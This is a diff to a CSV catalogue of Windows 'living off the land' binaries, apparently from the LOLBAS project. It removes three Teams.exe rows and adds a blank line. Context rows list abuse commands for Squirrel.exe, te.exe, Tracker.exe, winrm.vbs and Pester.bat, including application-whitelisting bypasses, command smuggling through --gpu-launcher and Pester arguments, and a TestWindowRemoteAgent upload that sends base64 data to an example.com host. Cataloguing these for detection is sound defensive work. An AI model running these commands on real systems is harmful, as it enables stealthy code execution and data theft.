@@ -386,9 +386,6 @@ Squirrel.exe,squirrel.exe --updateRollback={REMOTEURL},AWL Bypass,C:\Users\<user
 Squirrel.exe,squirrel.exe --updateRollback={REMOTEURL},Execute,C:\Users\<username>\AppData\Local\Microsoft\Teams\current\Squirrel.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/,Windows 7 and up with Microsoft Teams installed,squirrel.exe --updateRollback
 te.exe,te.exe {PATH:.wsc},Execute,no default,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Te/,Windows,te.exe
 te.exe,te.exe {PATH:.dll},Execute,no default,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Te/,Windows,te.exe
-Teams.exe,teams.exe,Execute,C:\Users\<username>\AppData\Local\Microsoft\Teams\current\Teams.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Teams/,"Windows 10, Windows 11",teams.exe
-Teams.exe,teams.exe,Execute,C:\Users\<username>\AppData\Local\Microsoft\Teams\current\Teams.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Teams/,"Windows 10, Windows 11",teams.exe
-Teams.exe,"teams.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",Execute,C:\Users\<username>\AppData\Local\Microsoft\Teams\current\Teams.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Teams/,"Windows 10, Windows 11",teams.exe --disable-gpu-sandbox --gpu-launcher
 TestWindowRemoteAgent.exe,TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000,Upload,C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\RemoteAgent\TestWindowRemoteAgent.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Testwindowremoteagent/,"Windows 10, Windows 11",TestWindowRemoteAgent.exe start -h -p 8000
 Tracker.exe,Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe,Execute,no default,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Tracker/,Windows,Tracker.exe /d /c
 Tracker.exe,Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe,AWL Bypass,no default,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Tracker/,Windows,Tracker.exe /d /c
@@ -447,6 +444,7 @@ winrm.vbs,"winrm invoke Create wmicimv2/Win32_Service @{Name=""Evil"";DisplayNam
 winrm.vbs,%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty,AWL Bypass,C:\Windows\System32\winrm.vbs,https://lolbas-project.github.io/lolbas/Scripts/Winrm/,"Windows 10, Windows 11",%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty
 Pester.bat,"Pester.bat [/help|?|-?|/?] ""$null; {CMD}""",Execute,c:\Program Files\WindowsPowerShell\Modules\Pester\<VERSION>\bin\Pester.bat,https://lolbas-project.github.io/lolbas/Scripts/pester/,"Windows 10, Windows 11",Pester.bat [ / help ? - ? / ? ] $null;
 Pester.bat,Pester.bat ;{PATH:.exe},Execute,c:\Program Files\WindowsPowerShell\Modules\Pester\<VERSION>\bin\Pester.bat,https://lolbas-project.github.io/lolbas/Scripts/pester/,"Windows 10, Windows 11",Pester.bat ;
+
 
 
 
